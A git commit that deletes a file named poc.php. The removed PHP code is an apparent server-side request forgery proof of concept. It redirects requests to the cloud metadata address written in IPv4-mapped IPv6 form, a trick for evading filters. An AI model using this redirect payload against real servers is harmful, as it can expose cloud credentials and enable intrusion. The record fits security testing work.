90a02c8b1c2787eac69330ff349ff5c47aeb3f99
Michael Valan <111842238+michaelvalan@users.noreply.github.com>
2025-03-20 19:31:53 +0530

    Delete poc.php

--- poc.php
+++
@@ -1,8 +0,0 @@
-<?php
-// Obtén los datos de la solicitud
-header("Access-Control-Allow-Origin: *");
-header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE");
-header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");
-header("Content-Type: application/json");
-header("Location: http://[::ffff:a9fe:a9fe]");
-?>
